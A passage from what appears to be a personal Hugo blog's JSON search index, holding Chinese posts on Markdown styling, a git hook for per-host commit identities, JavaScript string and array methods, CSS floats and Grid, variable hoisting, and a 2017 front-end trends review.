Correll, Bing Wright, Aakash Nihalani, László Moholy-Nagy Javier de Riba, Geoffroy Amelot, Matthew Chambers, Maud Vantours, Pawel Nolbert Maja Wronska, Alexander Semenov, Bobby McKenna, David Orias, Mat Lucas Below the Boat, Samantha Keely Smith, Jimmy Kong, Peter Mendelsund, Jordan Eagles  Related Posts ","permalink":"http://localhost:8000/public/post/css-color-choosing/","tags":["Color pick","css","sass"],"title":"Css Color Choosing"},{"categories":["Even theme preview"],"contents":"  Copy from 《Hugo 主题 Nuo 文章样式预览》\n 这篇文章集中说明主题所支持的 Markdown 语法和 Hugo Shortcodes 插件，你也可以在这里预览到他们的样子。如果你不喜欢某些样式，可以去修改 css/ 文件夹下的 .scss 文件。\n1.标题 H1 H2 H3 H4 H5 H6 2. 段落 使用单引号 * 或者单下划线 _ 标记 斜体强调 或者 斜体强调\n使用两个引号 ** 或者两个下划线 __ 标记 加粗强调 或者 加粗强调\n引号和下划线可叠加使用 → 只是加粗 斜体并加粗\n使用两个波浪线 ~~ 标记 已删除文字\n插入文字暂无 Markdown 标记，直接使用 HTML 标签 \u0026lt;ins\u0026gt; 标记 插入文字\n行内代码使用反引号标记 → print(\u0026quot;hello world\u0026quot;)\n上标 X2 / 下标 X2\n按键 Ctrl\n外链 chekun\u0026rsquo;s blog\n页面内段落 图片\n注意：你可以通过 {#section-id} 方式自定义段落锚点\n参考资料 [1][2]\n3. 列表 以下的无序、有序和任务列表均支持二级嵌套，不建议使用二级以上嵌套。\n3.1 无序列表  无序列表  嵌套的无序列表 嵌套的无序列表  无序列表  嵌套的有序列表 嵌套的有序列表  无序列表  3.2 有序列表  有序列表  嵌套的有序列表 嵌套的有序列表  有序列表  嵌套的无序列表 嵌套的无序列表  有序列表  3.3 定义列表  CSS 层叠样式表  3.4 任务列表 Cmd Markdown 开发 改进 Cmd 渲染算法，使用局部渲染技术提高渲染效率 支持以 PDF 格式导出文稿 新增Todo列表功能 语法参考 改进 LaTex 功能 修复 LaTex 公式渲染问题 新增 LaTex 公式编号功能 语法参考  七月旅行准备 准备邮轮上需要携带的物品 浏览日本免税店的物品 购买蓝宝石公主号七月一日的船票   4. 引用  野火烧不尽，春风吹又生。\n\u0026ndash; 白居易《赋得古原草送别》\n 5. 代码 以本站的一段 JavaScript 代码做演示。\n// Initialize video.js player if (document.getElementById('my-player') !== null) { /* eslint-disable no-undef */ videojs('#my-player', { aspectRatio: '16:9', fluid: true, }); }  6. 分割线 中间能写字的分割线，如果你修改了分割线中字的内容，请配合修改 CSS 样式。\n7. 图片 不带标题的图片，如下图👇\n带标题的图片，如下图👇\n showcase.png   8. 表格 使用 Markdown 画的表格，如下表👇\n   Tables Are Cool     col 3 is right-aligned $1600   col 2 is centered $12   zebra stripes are neat $1    9. 数学公式 主题使用了 MathJax 开源库来实现对数学公式的支持，使用 $$ 标记。\n$$ evidence_{i}=\\sum_{j}W_{ij}x_{j}+b_{i} $$\n10. 网易云音乐 主题文章中可以轻松插入 网易云音乐 的指定音乐，你可以根据需要将音乐设置为自动播放，在主题目录 layouts/shortcodes 文件夹下的 music.html 对该标签进行定义。\n 11. YouTube 由于不明原因可能无法播放。\n  参考资料  Markdown Cheatsheet Markdown 语法手册  ","permalink":"http://localhost:8000/public/post/preview-even/","tags":["Theme preview"],"title":"Theme preview"},{"categories":null,"contents":" 青河船一 KULEYUXUAN  ","permalink":"http://localhost:8000/public/about/","tags":null,"title":"About"},{"categories":["git","搬运整理"],"contents":"出自简书\n 问题的起因来自于某天一位同学的问题：\u0026rdquo;我给一个知名开源项目提交了代码，也被合并了，为什么 contributors 里面没有我？\u0026rdquo;其实，这多是因为提交代码时本地仓库的user.name、user.email与GitHub账号不匹配导致，只有提交代码时的用户设置与自己的 GitHub 账号相匹配时，各项数据才会被 GitHub 计入统计。如下图所示，这样的 commit 记录便来自于一个用户设置和我 GitHub 账号不匹配的本地仓库。\n 如果你不仅使用 GitHub ，还会向公司自建的 GitLab ，以及 oschina 、coding.net 等基于 Git 的托管服务商提交代码，那么便会面临这个问题：你需要为不同来源的 Git 仓库一一配置用户名与邮箱信息，来避免上述的不同步情况。然而，手动在每个本地仓库路径下都使用 git config user.name 和 git config user.email 命令，难免会有忘记的情况，也过于繁琐。所以，我们可以使用Git初始模板、钩子函数的特性，达到在每次clone一个新的仓库时，根据仓库来源域名的不同，自动配置不同的用户信息。\n 首先，在命令行使用该命令建立一个新的文件夹：mkdir -p ~/.git-templates/hooks 然后配置git，让git知道这个文件夹是你的模板文件夹：git config --global init.templatedir ~/.git-templates 接下来，在这个文件夹中新建钩子文件：vi ~/.git-templates/hooks/post-checkout  钩子文件的内容较长，可在文末附带的链接中查看复制即可，完成之后赋予这个文件可执行权限：chmod +x ~/.git-templates/hooks/post-checkout\n 最后，新建一个文件：vi ~/.git-clone-init  最后一个文件是唯一一个内容需要自己配置的文件，也是整个过程的关键，内容格式如图2，意为对应不同域名下的仓库，自动配置不同的user.name和user.email。\n整个过程的原理就是我们在执行克隆操作时，git会执行初始模板里的钩子文件，钩子文件根据git-clone-init文件定义的规则，自动配置用户名与邮箱信息。这套流程来自于一个GitHub开源库，目前star还很少，大家可以去支持一下~\n参考：\n DrVanScott/git-clone-init 让你的git拥有不同身份  ","permalink":"http://localhost:8000/public/post/using-git-hook/","tags":["git hook","github","配置"],"title":"利用 Git-hook 自动配置不同仓库的用户信息"},{"categories":["学习笔记"],"contents":"这里总结一下 js 中字符串及数组的操作方法\n字符串操作方法   charAt() 返回在指定位置的字符\n charCodeAt() 返回在指定的位置的字符的 Unicode 编码 fromCharCode() 从字符编码创建一个字符串 slice() 提取字符串的片断，并在新的字符串中返回被提取的部分 split() 把字符串分割为字符串数组 concat() 连接字符串 indexOf() 检索字符串 lastIndexOf() 从后向前搜索字符串。 match() 找到一个或多个正则表达式的匹配 replace() 替换与正则表达式匹配的子串 search() 检索与正则表达式相匹配的值(大小写敏感)，未找到输出-1   \ncharAt() 返回在指定位置的字符\nvar str = \u0026quot;abac_dfra_wa\u0026quot;; console.log(str.charAt(3)); //输出 c  charCodeAt() 返回在指定的位置的字符的 Unicode 编码\nvar str = \u0026quot;abac_dfra_wa\u0026quot;; console.log(str.charCodeAt(3)); //输出99  fromCharCode() 从字符编码创建一个字符串\nconsole.log(String.fromCharCode(72,69,76,76,79)); //输出HELLO  slice() 提取字符串的片断，并在新的字符串中返回被提取的部分\nvar str=\u0026quot;Hello happy world!\u0026quot; console.log(str.slice(6)); //输出happy world! console.log(str.slice(6, 11)); //输出happy  split() 把字符串分割为字符串数组\n\u0026quot;|a|b|c\u0026quot;.split(\u0026quot;|\u0026quot;) ////将返回[\u0026quot;\u0026quot;, \u0026quot;a\u0026quot;, \u0026quot;b\u0026quot;, \u0026quot;c\u0026quot;] \u0026quot;How are you doing today?\u0026quot;.split(\u0026quot; \u0026quot;,3) //返回 How,are,you \u0026quot;hello\u0026quot;.split(\u0026quot;\u0026quot;)\t//可返回 [\u0026quot;h\u0026quot;, \u0026quot;e\u0026quot;, \u0026quot;l\u0026quot;, \u0026quot;l\u0026quot;, \u0026quot;o\u0026quot;]  concat() 连接字符串\nvar str = \u0026quot;abac_dfra_wa\u0026quot;; console.log(str.concat('_000')); //输出abac_dfra_wa_000  indexOf() 检索字符串\nvar str = \u0026quot;abac_dfra_wa\u0026quot;; console.log(str.indexOf('ac')); //输出2  lastIndexOf() 从后向前搜索字符串\nvar str = \u0026quot;abac_dfra_wa\u0026quot;; console.log(str.lastIndexOf('ac')); //输出2  match() 找到一个或多个正则表达式的匹配\nvar str=\u0026quot;1 plus 2 equal 3\u0026quot; console.log(str.match('plus')); // plus console.log(str.match('st')); // null console.log(str.match(/\\d+/g)) // [ '1', '2', '3' ]  replace() 替换与正则表达式匹配的子串\nvar str=\u0026quot;Hello WoRlD!\u0026quot; console.log(str.replace(/WoRlD/, \u0026quot;World\u0026quot;)); // Hello World! var str=\u0026quot;Hello WoRlD! \u0026quot; str += str; console.log(str.replace(/WoRlD/g, \u0026quot;World\u0026quot;)); //替换所有, 输出：Hello World! Hello World! var str = \u0026quot;javascript Tutorial \u0026quot;; console.log(str.replace(/javascript/i, \u0026quot;JavaScript\u0026quot;)); //确保匹配字符串大写字符的正确 var name = \u0026quot;Doe, John\u0026quot;; console.log(name.replace(/(\\w+)\\s*, \\s*(\\w+)/, \u0026quot;$2 $1\u0026quot;)); //将把 \u0026quot;Doe, John\u0026quot; 转换为 \u0026quot;John Doe\u0026quot; 的形式  search() 检索与正则表达式相匹配的值(大小写敏感)，未找到输出-1\nvar str=\u0026quot;Hello World!\u0026quot; console.log(str.search(/World/)); //输出6 var str=\u0026quot;Hello World!\u0026quot; console.log(str.search(/world/i)); //忽略大小写的检索，输出6  数组操作方法   shift() 删除原数组第一项，并返回删除元素的值；如果数组为空则返回undefined\n unshift() 将参数添加到原数组开头，并返回新数组的长度 pop() 删除原数组最后一项，并返回删除元素的值；如果数组为空则返回undefined push() 将参数添加到原数组末尾，并返回数组的长度 concat() 回一个新数组，是将参数添加到原数组中构成的 splice(start,deleteCount,val1,val2,...) 从start位置开始删除deleteCount项，并从该位置起插入val1,val2,\u0026hellip;\n reverse() 将数组反序 sort(orderfunction) 按指定的参数对数组进行排序 slice(start,end) 返回从原数组中指定开始下标到结束下标之间的项组成的新数组 join(separator) 将数组的元素组起一个字符串，以separator为分隔符，省略的话则用默认用逗号为分隔符   shift() 删除原数组第一项，并返回删除元素的值；如果数组为空则返回undefined\nvar a = [1,2,3,4,5]; var b = a.shift(); //a:[2,3,4,5] b:1  unshift() 将参数添加到原数组开头，并返回数组的长度\nvar a = [1,2,3,4,5]; var b = a.unshift(-2,-1); //a:[-2,-1,1,2,3,4,5] b:7  注:在IE6.0下测试返回值总为undefined，FF2.0下测试返回值为7，所以这个方法的返回值不可靠，需要用返回值时可用splice代替本方法来使用。\npop() 删除原数组最后一项，并返回删除元素的值；如果数组为空则返回undefined\nvar a = [1,2,3,4,5]; var b = a.pop(); //a:[1,2,3,4] b:5  push() 将参数添加到原数组末尾，并返回数组的长度\nvar a = [1,2,3,4,5]; var b = a.push(6,7); //a:[1,2,3,4,5,6,7] b:7  concat() 返回一个新数组，是将参数添加到原数组中构成的\nvar a = [1,2,3,4,5]; var b = a.concat(6,7); //a:[1,2,3,4,5] b:[1,2,3,4,5,6,7]  splice(start,deleteCount,val1,val2,...) 从start位置开始删除deleteCount项，并从该位置起插入val1,val2,\u0026hellip;\nvar a = [1,2,3,4,5]; var b = a.splice(2,2,7,8,9); //a:[1,2,7,8,9,5] b:[3,4] var b = a.splice(0,1); //同shift a.splice(0,0,-2,-1); var b = a.length; //同unshift var b = a.splice(a.length-1,1); //同pop a.splice(a.length,0,6,7); var b = a.length; //同push  reverse() 将数组反序\nvar a = [1,2,3,4,5]; var b = a.reverse(); //a:[5,4,3,2,1] b:[5,4,3,2,1]  sort(orderfunction) 按指定的参数对数组进行排序\nvar a = [1,2,3,4,5]; var b = a.sort(); //a:[1,2,3,4,5] b:[1,2,3,4,5]  slice(start,end) 返回从原数组中指定开始下标到结束下标之间的项组成的新数组\nvar a = [1,2,3,4,5]; var b = a.slice(2,5); //a:[1,2,3,4,5] b:[3,4,5]  join(separator) 将数组的元素组起一个字符串，以separator为分隔符，省略的话则用默认用逗号为分隔符\nvar a = [1,2,3,4,5]; var b = a.join(\u0026quot;|\u0026quot;); //a:[1,2,3,4,5] b:\u0026quot;1|2|3|4|5\u0026quot;  数组方法小结 数组是JavaScript提供的一个内部对象，它是一个标准的集合，我们可以添加(push)、删除(shift)里面元素，我们还可以通过for循环遍历里面的元素，那么除了数组我们在JavaScript里还可以有别的集合吗?\n由于JavaScript的语言特性，我们可以向通用对象动态添加和删除属性。所以Object也可以看成是JS的一种特殊的集合。下面比较一下Array和Object的特性:\n//Array: /*新建:*/var ary = new Array(); 或 var ary = []; /*增加:*/ary.push(value); /*删除:*/delete ary[n]; /*遍历:*/for ( var i=0 ; i \u0026lt; ary.length ; ++i ) ary[i]; //Object: /*新建:*/var obj = new Object(); 或 var obj = {}; /*增加:*/obj[key] = value; (key为string) /*删除:*/delete obj[key]; /*遍历:*/for ( var key in obj ) obj[key];  从上面的比较可以看出Object完全可以作为一个集合来使用，在使用Popup窗口创建无限级Web页菜单(3)中我介绍过Eric实现的那个MenuCache，它也就是一个模拟的集合对象。\n如果我们要在Array中检索出一个指定的值，我们需要遍历整个数组:\nvar keyword = ; for ( var i=0 ; i \u0026lt; ary.length ; ++i ) { if ( ary[i] == keyword ) { // todo } }  而我们在Object中检索一个指定的key的条目，只需要是要使用:\nvar key = ''; var value = obj[key]; // todo  Object的这个特性可以用来高效的检索Unique的字符串集合，遍历Array的时间复杂度是O(n)，而遍历Object的时间复杂度是O(1)。虽然对于10000次集合的for检索代价也就几十ms，可是如果是1000*1000次检索或更多，使用Object的优势一下就体现出来了。在此之前我做了一个mapping，把100个Unique的字符mapping到1000个字符串数组上，耗时25-30s!后来把for遍历改成了Object模拟的集合的成员引用，同样的数据量mapping，耗时仅1.7-2s!!!\n对于集合的遍历效率(从高到低):var value = obj[key]; \u0026gt; for ( ; ; ) \u0026gt; for ( in )。效率最差的就是for( in )了，如果集合过大，尽量不要使用for ( in )遍历。\n","permalink":"http://localhost:8000/public/post/javascript-%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95/","tags":["javascript","字符串","数组"],"title":"javascript 字符串及数组操作方法"},{"categories":["学习笔记"],"contents":"最好用的\u0026mdash;:after伪元素法：\n.clearfix:after { content: \u0026quot;\u0026quot;; display: block; height: 0; /*visibility: hidden;*/ clear: both; } .clearfix { *zoom: 1; /*由于IE6-7不支持:after，使用 zoom:1触发 hasLayout*/ }  See the Pen QmdrBm by kuleyu (@kuleyu) on CodePen.\n\n参考 1. 那些年我们一起清除过的浮动\n[20]:\n","permalink":"http://localhost:8000/public/post/css-%E6%B5%AE%E5%8A%A8%E4%B8%8E%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8/","tags":["css","float"],"title":"css 浮动与清除浮动"},{"categories":["学习笔记"],"contents":" 什么是变量提升？ 变量提升：把变量声明提升到当前执行环境的最顶端。按照js代码解析原则，js引擎在读取js代码时分两个步骤，第一个步骤是解释，第二个步骤是执行。所谓解释就是会先通篇扫描所有的Js代码，然后把所有声明提升到顶端；而执行就是操作一类的，依次执行解释完的代码。\n变量提升大致可分为两类：  var 声明的变量的提升。只将变量声明语句提升至当前执行环境的顶端，初始化语句（若有）则依然处于原位置不动。 function 声明的函数的提升。将整个函数声明语句块提升至当前执行环境顶端，同时函数在声明时就已经将函数名初始化了。若有多个，则依次往下排，即先声明的位于最前。  回顾   一个变量的整个生命周期有三个阶段，声明阶段，初始化阶段，赋值阶段。只声明而未初始化的变量，其值默认为“undefined”。 javascript var text; text+=\u0026quot;你好\u0026quot;; alert(text); //\u0026quot;undefined你好\u0026quot;  没经 var 声明，而直接初始化，会定义一个全局变量。 注意，以表达式形式创建的函数没有提升作用。   实例分析 下面通过一些实例来了解一下吧。 - 例子1 关于下面代码：\n(function(){ console.log(typeof a); //\u0026quot;function\u0026quot; var a = 1; function a(){}; })();  被javascript执行引擎解释后的形态，等同于这个：\n(function() { var a; function a() { } console.log(typeof a); //\u0026quot;function\u0026quot; a = 1; })();   例子2 关于下面代码： javascript (function(){ console.log(typeof a); //function var a = 1; function a(){}; console.log(typeof a); //number })();  被javascript执行引擎解释后的形态，等同于这个： javascript (function(){ var a; function a(){}; console.log(typeof a); //function a = 1; console.log(typeof a); //number })();   总结 不少文章中说的“函数声明的提升优先于变量提升”其实并不准确。函数声明的提升与变量提升都是根据声明的先后顺序依次排列的，只不过“变量声明只提升变量的声明语句；而函数声明提升的是整个语句块，关键一点是，函数声明时就已经对函数名初始化了”。 另外，以表达式形式创建的函数没有提升作用。\n相关阅读： let深入理解\u0026mdash;let存在变量提升吗？\n[20]:\n","permalink":"http://localhost:8000/public/post/javascript-%E5%8F%98%E9%87%8F%E6%8F%90%E5%8D%87%E7%9B%B8%E5%85%B3/","tags":["javascript","变量提升"],"title":"javascript 变量提升相关"},{"categories":["Even theme preview"],"contents":"This post is hidden from the home page.\n\nBut you can see it in archives, rss or other pages.\n","permalink":"http://localhost:8000/public/post/preview-hidden-post/","tags":null,"title":"This is a hidden post."},{"categories":["学习笔记"],"contents":" 找到了几个比较有意思的网站：headlesscms.org、staticgen.com、stackshare.io\nJAMstack 介绍：The Sweetness of JAMstack: JavaScript, APIs and Markup、前端大事件和趋势回顾，2018 何去何从？\u0026mdash;8、静态网站卷土重来\n [20]:\n","permalink":"http://localhost:8000/public/post/jamstack%E4%B8%8Ecms/","tags":["CMS","JAMstack"],"title":"JAMstack与CMS"},{"categories":["搬运整理"],"contents":" Source\n2017 前端大事件和趋势回顾，2018 何去何从？  2017年，前端开发继续飞速发展。以下是在过去的一年中非常值得关注的十大事件整理，主要参考了国内外的一些报道和文章，希望能对大家在思考 2018 年的趋势和走向上有所帮助。欢迎指正、评论和补充。\n 1、React 16 和 MIT 许可证 2017年，React 继续在前端领域占据主导地位，备受期待的 React 16 也正式发布。该版本包含可实现异步 UI 渲染的 fiber 架构，以及更便捷的错误管理。\n不过，React 更引人关注的不是其新特性，而是开源许可证的更改。Facebook 放弃了导致很多企业拒绝使用其开源项目的 BSD+专利许可模式，并采用了对用户友好的 MIT 许可证。同时，Jest、Flow、Immutable.js 和 GraphQL 等项目也更改为了 MIT 许可证。 \u0026gt; 相关阅读：\n React 16.0.0 发布，去除专利条款，改用 MIT 许可证 Facebook 被集体\u0026rdquo;声讨\u0026rdquo;，要求更改 ReactJS 许可  2、下一代 Web 应用模型 — PWA PWA（Progressive Web App）是 Google 于 2016 年提出的概念，2017 年已被迅速采用。PWA 旨在增强 Web 体验，可显著提高加载速度、可离线工作、可被添加至主屏、全屏执行、推送通知消息等等。这些特性将使得 Web 应用渐进式接近原生 App。\n 相关阅读：\n  您的第一个 Progressive Web App Chrome Web App 已被谷歌干掉 未来将主推 PWA  3、Yarn 快速普及，NPM 跟上脚步 Facebook 与 Exponent、 Google 和 Tilde 合作开发的 Yarn 在2016年10月发布以后，迅速蹿红。Yarn 可以看做是对 NPM 缺失的一些关键特性的补充，能够更快速地安装软件包和管理依赖关系，并且可以在跨机器或者无网络的安全环境中保持代码的一致性。据悉，Yarn 下载量目前已超过10亿次（每月下载量达到125万次）。\nYarn 的成功，使得 NPM 在 5.0 版本中也加入了上述的这些特性。\n 相关阅读：\n  npm v5.0.0 正式发布，改进了稳定性 Facebook 新推 Yarn，或取代 npm 客户端  4、WebAssembly 受主流浏览器支持 WebAssembly （wasm）在今年受到了所有主流浏览器的支持，包括 Chrome、Firefox、Safari 和 Edge 。wasm 源于 Mozilla 发起的 Asm.js 项目，用于补充 JavaScript，其本地解码速度比 JS 解析快得多，让高性能的 Web 应用在浏览器上运行成为可能，比如视频游戏、计算机辅助设计、视频和图像编辑、科学可视化等等。\n而且由于 wasm 字节码（Bytecode）较一般程序代码小许多倍，意谓着这项标准可节省移动设备的使用带宽，有助于改善网页加载速度，且字节码更适合浏览器读取。\nwasm 还提供了一个JavaScript API，为前端开发人员提供了一个更容易的切入点。\n 相关阅读：\n  主流浏览器都加入了 WebAssembly 支持 抢先一步，Rust 构建版支持直接编译 WebAssembly  5、Angular 发布了 v4，以及……v5 由于采用语义化版本控制，Angular 在今年跨越了两个大版本：于 3月23日 发布的 Angular 4 以及于 11月1日 发布的 Angular 5。Angular 4 优化了视图引擎、减少代码体积；Angular 5 中包含了一些用户期待已久的改进，像是编译器的改进，能更快的构建/重建；新的 @angular/service-worker 包能够更好的构建渐进式 Web 应用程序。\n 相关阅读：\n  Angular 5.0.0 发布，Web 前端框架 Angular 4.0.0 正式版发布， Web 前端框架 没有 Angular 3 ，Angular 4 计划2017年3月发布  6、Vue.js 继续流行 既然说到了 React ，说到了 Angular ，自然不能落下 Vue 。2017年，Vue 依然越来越受欢迎，该框架提供基于组件的架构，是 React 在因许可证问题被抵制时的主要替代方案之一。它已经被包括 GitLab 在内的许多大型公司采用，在 Stack Overflow 上的关注度居高不下。\n 相关阅读：\n  Vue.js 框架成为 WordPress 弃用 React 后的最佳选择 翻译 | 我们为什么以及是如何从 Angular.js 迁移到 Vue.js ？  7、CSS-in-JS 在争议中沉淀 React 的出现，打破了以前\u0026rdquo;关注点分离\u0026rdquo;的网页开发原则，因其采用组件结构，组件强制要求把 HTML、CSS、JavaScript 写在一起。随着 React 的走红和组件模式深入人心，这种\u0026rdquo;关注点混合\u0026rdquo;的新写法逐渐成为主流。表面上，React 的写法是 HTML、CSS、JavaScript 混合在一起。实际上并不是，其实是用 JavaScript 在写 HTML 和 CSS，React 是在 JavaScript 里面实现了对 HTML 和 CSS 的封装。\n由于 CSS 的封装非常弱，导致了一系列的第三方库，用来加强 React 的 CSS 操作，它们统称为 CSS in JS，意思就是使用 JS 语言写 CSS。\nCSS in JS 的出现带来了很多争议，有不少人认为是在重复造轮子，或者说是没有找到其优势。CSS-IN-JS 是不是未来的方向我们暂且不议，但其在2017年已得到明显的采用。\n8、静态网站卷土重来 2017 ，静态网站卷土重来。Gatsby 等框架使你能够使用 React 和其他现代工具构建静态网站。不是每个网站都需要或应该是一个复杂的现代 Web 应用，静态网站生成器能够提供的服务器端渲染和无与伦比的速度，正式其优势所在。\n静态网站生成器还引发了另一个被称为 JAMStack 的趋势：\u0026rdquo;JavaScript，APIs，Markup\u0026rdquo;。 JAMStack 使用相同的静态预构建 HTML 文件以及可重复使用的 API 和 JavaScript 来处理请求/响应周期内的任何动态编程，旨在提供更好的性能，更高的安全性，更低的扩展成本和更优的开发人员体验。\n9、GraphQL 继续挑战 REST 虽然很多人认为 GraphQL 在2017年依然没有火起来，但不可否认的是 GraphQL 已逐渐占据了一席之地。不再管理多个端点并获取不必要的数据，GraphQL 允许客户端声明式地定义所需的数据，并从单个端点检索所有数据。这也正式它在刚出现时被认为是革命性的 API 工具的原因，因为它可以让客户端在请求中指定希望得到的数据，而不像传统的 REST 那样只能呆板地在服务端进行预定义。\n10、TypeScript 和 Flow 受追捧 2017年，TypeScript 受到了很多 JavaScript 开发者的追捧。TypeScript 由微软创建，也是新版 Angular 采用的语言，其强类型正式优势所在。 而 Flow 则提供了一种更加灵活的方式来引入类型，而不需要进行重构。\n本文由开源中国整理，转载请注明出处。\n推荐阅读\nLinux 运维人员最常用 150 个命令汇总\n从 Zero 到 Hero ，一文掌握 Python\n","permalink":"http://localhost:8000/public/post/2017-%E5%89%8D%E7%AB%AF%E5%A4%A7%E4%BA%8B%E4%BB%B6%E5%92%8C%E8%B6%8B%E5%8A%BF%E5%9B%9E%E9%A1%BE2018-%E4%BD%95%E5%8E%BB%E4%BD%95%E4%BB%8E/","tags":["前端记事"],"title":"2017 前端大事件和趋势回顾，2018 何去何从？"},{"categories":["搬运整理"],"contents":"  英文原文：A Complete Guide to Grid,感谢zhaozhiming的翻译。\n 介绍 CSS Grid 布局（又叫“Grid”），是一个基于网格的二维布局系统，目的是为了完全改变我们基于网格设计用户界面的方式。CSS 可以用来做我们的网页布局，但它在这一方面做的不是很好。开始的时候我们使用tables, 然后使用floats，positioning和inline-block，但这些方法本质上都是 hack 的方法并缺少一些重要功能（比如垂直居中）。Flexbox帮助我们解决了问题，但它是简单的一维布局，而不是复杂的二维布局（实际上 Flexbox 和 Grid 可以很好地组合起来使用）。Grid 是第一个专门为了解决那些我们一直使用 hack 手段而导致的页面布局问题而创建的 CSS 模块。 我写这篇文章主要收到两个事情启发，第一个是Rachel Andrew写的一本好书——《Get Ready for CSS Grid Layout》，这本书把对 Grid 全面而清晰的介绍作为全书的基调，我高度推荐大家去买这本书来读一下。我另外一件受启发的事情是Chris Coyier对 Flexbox 的完整介绍，这是我推荐学习 flexbox 的首选资源，它帮助了很多人，当你用 Google 搜索 flexbox 时可以从它的搜索结果看出其影响范围。你可以看到那篇文章跟我的文章有很多相似的地方，因为我这篇文章就是通过模仿那篇最好的文章来写的。（译者注：可以看到这两篇文章都是按照两列分布的方式来介绍 flexbox 和 Grid。）\n我这篇文章的目的是为了介绍 Grid 在最新规范中的概念，所以我不会涵盖过时的 IE 语法，并且当规范更新时我将尽力更新这篇文章。\n基础和浏览器支持 开始使用 Grid 非常简单，你只需要通过display: grid来定义一个容器元素作为网格，再通过grid-template-columns和grid-templaet-rows设置列和行的大小，然后通过grid-column和grid-row来设置网格的子元素，grid 元素的顺序对其实现的效果没有任何影响。你的 CSS 可以任意调节它们的顺序，这可以让你很方便地在媒体查询中重新编排你的网格。想象一下在你的整个页面中定义了一个布局，然后通过几行 CSS 代码就可以重新编排出另外一个布局来适应另外一个屏幕，所以说 Grid 是有史以来最强大一个的 CSS 模块。\n理解 Grid 最重要的一件事情是现在还不能把它用在生产环境。它现在还只是一个 W3C 的在制品草稿，还没有任何浏览器默认是支持它的。IE10 和 11 可以支持它，但它们是用过时的语法做的一个老旧的实现。最好地使用 Grid 的方式是设置 Chrome，Opera 或者 Firefox 的特殊标志来启用它。在 Chrome 中，在地址栏输入chrome://flags然后将experimental web platform features选项设置为enable，这个方法同样适用于 Opera(opera://flags)，在 Firefox 中，将layout.css.grid选项设置为可用。\n截至2017年3月，许多浏览器都提供了原生的、无需前缀的CSS Grid支持：Chrome（包括Android），Firefox，Safari（包括iOS）、Opera 和 Edge。另一方面，Internet Explorer 10和11支持它，但是它用的是一个过时的语法实现的。\n这是一个支持的浏览器表格，详情见caniuse.com：\n  Chrome Safari Firefox Opera IE Android iOS     29+ (Behind flag) 10.1+ 40+ (Behind flag) 28+ (Behind flag) 10+ (Old syntax) 62+ 10.3+    除了微软，其他浏览器好像不想太早实现 Grid 直到规范完全成熟为止，这是一件好事，这意味着我们不用担心以后使用 Grid 要使用多种语法。 在生产环境使用 Grid 只是时间上的问题，但现在是时候可以学习它了。\n重要的术语 在开始了解 Grid 的概念之前先理解其相关的术语是很重要的，因为这里涉及的概念都有点相似，所以如果你不记住它们在规范中的定义的话会很容易被搞混，但请不用担心，这里的术语并不多。\n{% img http://opifddwc7.bkt.clouddn.com/18-1-29/24226299.jpg %}\n网格容器（grid container） 网格容器是指这个元素使用了display: grid，它是所有网格元素的直接父级，在这个例子container的元素就是网格容器。\n{% codeblock lang:html %}     {% endcodeblock %}\n网格项（grid item） 网格项是指网格容器的子元素（比如其直接后代），在下面的例子中item的元素是网格项，但sub-item的元素不是。\n{% codeblock lang:html %}     {% endcodeblock %}\n网格线（grid line） 分隔的线组成了网格的结构。它们可以是垂直的（“列网格线”）或者水平的（“行网格线”），也可以在行或列的任一边。下面的例子中黄色的线是一个列网格线的例子。\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-line.png %}\n网格轨道（grid track） 网格轨道是指两根毗邻网格线中间的位置，你可以认为是网格的行或者列。下面例子的中网格轨道是第二和第三行网格线中间的位置。\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-track.png %}\n网格单元（grid cell） 网格单元是指两根毗邻的行网格线和列网格线中间的位置，它是一个单独的网格“单元”，下面的例子中网格单元是指第 1 和 2 根行网格线和第 2 和 3 根列网格线中间的位置。\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-cell.png %}\n网格区域（grid area） 网格区域是指 4 根网格线包围的空间，一个网格空间可能由任意数量的网格单元构成。下面的例子中网格区域是指在第 1 和 3 的行网格线和第 1 和 3 列网格线中间的位置。\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-area.png %}\n网格容器的属性  display grid-template-columns grid-template-rows grid-template-areas grid-column-gap grid-row-gap grid-gap justify-items align-items justify-content align-content grid-auto-columns grid-auto-rows grid-auto-flow grid  display 定义一个元素为网格容器并为其内容创建一个新的网格格式环境。\n值有：\n grid - 生成一个块级别的网格 inline-grid - 生成一个内联级别的网格 subgrid - 如果你的网格容器是它自己的一个网格子项（比如内嵌的网格），你可以使用这个属性来表示你想要从其父级来获取行和列的大小而不是自己来指定它们。  {% codeblock lang:css %} .container{ display: grid | inline-grid | subgrid; } {% endcodeblock %}\n注意：column, float, clear和vertical-align对网格容器没有效果。\ngrid-template-columns与grid-template-rows 通过空格分隔的一系列值来定义网格的行和列，这些值相当于轨迹大小，它们之间的距离相当于网格线。\n值有：\n \u0026lt;track-size\u0026gt; - 可以是一个长度，百分比或者是网格中自由空间的份数（使用fr这个单位） \u0026lt;line-name\u0026gt; - 一个你选择的任意名字  {% codeblock lang:css %} .container{ grid-template-columns:  \u0026hellip; |   \u0026hellip;; grid-template-rows:  \u0026hellip; |   \u0026hellip;; } {% endcodeblock %}\n举例：\n当你在轨迹值中间留空格，网格线将被自动以数字命名：\n{% codeblock lang:css %} .container{ grid-template-columns: 40px 50px auto 50px 40px; grid-template-rows: 25% 100px auto; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-numbers.png %}\n但你可以给网格线指定一个名字，注意网格线命名时的中括号语法：\n{% codeblock lang:css %} .container{ grid-template-columns: [first] 40px [line2] 50px [line3] auto [col4-start] 50px [five] 40px [end]; grid-template-rows: [row1-start] 25% [row1-end] 100px [third-line] auto [last-line]; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-names.png %}\n注意一根网格线可以有多个名字，例如在下面的例子中第二根线有两个名字：row1-end 和 row2-start。\n{% codeblock lang:css %} .container{ grid-template-rows: [row1-start] 25% [row1-end row2-start] 25% [row2-end]; } {% endcodeblock %}\n如果你定义了容器的重复部分，你可以使用repeat()方法来生成多个相同值：\n{% codeblock lang:css %} .container{ grid-template-columns: repeat(3, 20px [col-start]) 5%; 